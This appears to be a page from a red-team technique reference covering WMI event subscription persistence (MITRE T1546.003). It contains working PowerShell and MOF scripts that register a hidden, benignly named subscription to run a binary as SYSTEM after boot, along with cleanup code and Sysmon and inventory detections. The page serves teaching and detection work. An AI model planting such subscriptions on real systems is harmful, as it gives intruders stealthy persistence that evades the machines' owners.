@@ -1,0 +1,213 @@
+---
+title: WMI Event Subscription
+mitre: T1546.003
+category: persistence
+group: Boot / Logon Autostart
+summary: Register a permanent WMI consumer to execute a payload when a system event fires.
+platform: [Windows]
+tags: ['WMI', 'PowerShell', 'MOF']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 7 min read
+callChain:
+  - call: create __EventFilter
+    desc: Define the WQL query that specifies the trigger (logon, process creation, timer, etc.).
+    dll: wbemprox
+  - call: create CommandLineEventConsumer / ActiveScriptEventConsumer
+    desc: Register the action to take when the filter fires — a command line or a VBScript body.
+    dll: wbemprox
+  - call: create __FilterToConsumerBinding
+    desc: Link the filter to the consumer; the subscription is now permanent in the WMI repository.
+    dll: wbemprox
+  - call: (trigger fires)
+    desc: WMI service (winmgmt) runs the consumer action inside svchost.exe — no user interaction needed.
+    dll: —
+detections:
+  - src: SYSMON EID 19 / 20 / 21
+    text: WmiEventFilter, WmiEventConsumer, and WmiEventConsumerToFilter creation events.
+  - src: BEHAVIOURAL
+    text: svchost.exe spawning unexpected child processes (cmd.exe, powershell.exe, wscript.exe).
+  - src: INVENTORY
+    text: Enumerate all __EventFilter, __EventConsumer, and __FilterToConsumerBinding objects in root\subscription.
+  - src: FILE
+    text: New or modified .mof files compiled into the WMI repository.
+related:
+  - mitre: T1547.001
+    title: Registry Run Keys
+    desc: Simpler, noisier; executes in the user session rather than from the SYSTEM-level WMI service.
+    href: /techniques/persistence/registry-run-keys
+  - mitre: T1546.015
+    title: COM Hijacking via TreatAs
+    desc: Also leaves no file in a predictable location.
+    href: /techniques/persistence/com-hijacking
+labKit:
+  - label: wmi_persist.ps1 + cleanup.ps1
+    href: 'https://github.com/thehackersbrain/maldev-lab-kit'
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+The Windows Management Instrumentation repository is a database that survives reboots and lives
+entirely inside `%SystemRoot%\System32\wbem\repository`. A permanent WMI event subscription is
+three objects: a **filter** (what to watch for), a **consumer** (what to do), and a **binding**
+that links them. When the WMI service processes a matching event, it runs the consumer inside
+`svchost.exe` — as SYSTEM, with no user session required.
+
+This makes WMI subscriptions a fileless-capable persistence mechanism. No binary needs to be
+dropped to a predictable path; the payload can be embedded in the consumer's script body or
+invoked via `CommandLineEventConsumer` pointing at a pre-staged binary.
+
+<Callout type="note">
+  Sysmon events 19/20/21 are the definitive detection. Without Sysmon or an equivalent WMI
+  provider event listener, a subscription can live in the repository for years undetected —
+  standard file-system forensics will never surface it.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+### PowerShell installation
+
+<CodeBlock
+  file="wmi_persist.ps1"
+  label="PowerShell"
+  lang="powershell"
+  class="mb-7.5"
+  code={`# Requires local admin / elevated session
+$trigger = "SELECT * FROM __InstanceModificationEvent WITHIN 60 " +
+           "WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' " +
+           "AND TargetInstance.SystemUpTime >= 120 " +
+           "AND TargetInstance.SystemUpTime < 180"
+
+# 1. Event filter -- fires ~2 minutes after boot, once
+$filter = Set-WmiInstance -Class __EventFilter \`
+    -Namespace "root\\subscription" \`
+    -Arguments @{
+        Name           = "SystemHealthCheck"
+        EventNamespace = "root\\cimv2"
+        QueryLanguage  = "WQL"
+        Query          = $trigger
+    }
+
+# 2. Consumer -- run a command as SYSTEM
+$consumer = Set-WmiInstance -Class CommandLineEventConsumer \`
+    -Namespace "root\\subscription" \`
+    -Arguments @{
+        Name                = "SystemHealthCheck"
+        CommandLineTemplate = "C:\\Windows\\Temp\\update.exe"
+        RunInteractively    = $false
+    }
+
+# 3. Binding -- link filter to consumer
+Set-WmiInstance -Class __FilterToConsumerBinding \`
+    -Namespace "root\\subscription" \`
+    -Arguments @{
+        Filter   = $filter
+        Consumer = $consumer
+    }
+
+Write-Host "[+] WMI subscription installed"`}
+/>
+
+### Cleanup
+
+<CodeBlock
+  file="cleanup.ps1"
+  label="PowerShell"
+  lang="powershell"
+  class="mb-7.5"
+  code={`$ns = "root\\subscription"
+Get-WMIObject -Namespace $ns -Class __FilterToConsumerBinding |
+    Where-Object { $_.Filter -like "*SystemHealthCheck*" } |
+    Remove-WmiObject
+
+Get-WMIObject -Namespace $ns -Class CommandLineEventConsumer |
+    Where-Object { $_.Name -eq "SystemHealthCheck" } |
+    Remove-WmiObject
+
+Get-WMIObject -Namespace $ns -Class __EventFilter |
+    Where-Object { $_.Name -eq "SystemHealthCheck" } |
+    Remove-WmiObject
+
+Write-Host "[+] WMI subscription removed"`}
+/>
+
+### MOF-based installation
+
+Managed Object Format files can be compiled directly into the repository with `mofcomp.exe`,
+useful when WMI provider access is restricted through PowerShell but the binary is reachable:
+
+<CodeBlock
+  file="persist.mof"
+  label="MOF"
+  lang="c"
+  class="mb-7.5"
+  code={`#pragma namespace("\\\\\\\\.\\\\root\\\\subscription")
+
+instance of __EventFilter as $filter {
+    Name          = "SystemHealthCheck";
+    EventNamespace = "root\\\\cimv2";
+    QueryLanguage = "WQL";
+    Query         = "SELECT * FROM __InstanceModificationEvent WITHIN 60 "
+                    "WHERE TargetInstance ISA "
+                    "'Win32_PerfFormattedData_PerfOS_System'";
+};
+
+instance of CommandLineEventConsumer as $consumer {
+    Name                = "SystemHealthCheck";
+    CommandLineTemplate = "C:\\\\Windows\\\\Temp\\\\update.exe";
+    RunInteractively    = false;
+};
+
+instance of __FilterToConsumerBinding {
+    Filter   = $filter;
+    Consumer = $consumer;
+};`}
+/>
+
+## Consumer types
+
+| Consumer class | Capability | Detection |
+|---|---|---|
+| `CommandLineEventConsumer` | Run any command line | Child of `svchost.exe` |
+| `ActiveScriptEventConsumer` | Embedded VBScript / JScript | Script engine in svchost |
+| `LogFileEventConsumer` | Write to a log file | Low risk for detection |
+| `NTEventLogEventConsumer` | Write to event log | Rarely abused |
+| `SMTPEventConsumer` | Send email | Useful for alerting, sometimes exfiltration |
+
+`ActiveScriptEventConsumer` with an embedded payload body is the most fileless option — the
+entire payload script lives in the repository object with no file on disk.
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+The definitive audit is to enumerate the repository directly:
+
+<CodeBlock
+  file="audit.ps1"
+  label="PowerShell"
+  lang="powershell"
+  class="mb-7.5"
+  code={`Get-WMIObject -Namespace root\\subscription -Class __EventFilter
+Get-WMIObject -Namespace root\\subscription -Class __EventConsumer
+Get-WMIObject -Namespace root\\subscription -Class __FilterToConsumerBinding`}
+/>
+
+On a clean endpoint, these return empty or only vendor-installed entries. Any unexpected objects
+should be investigated immediately.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
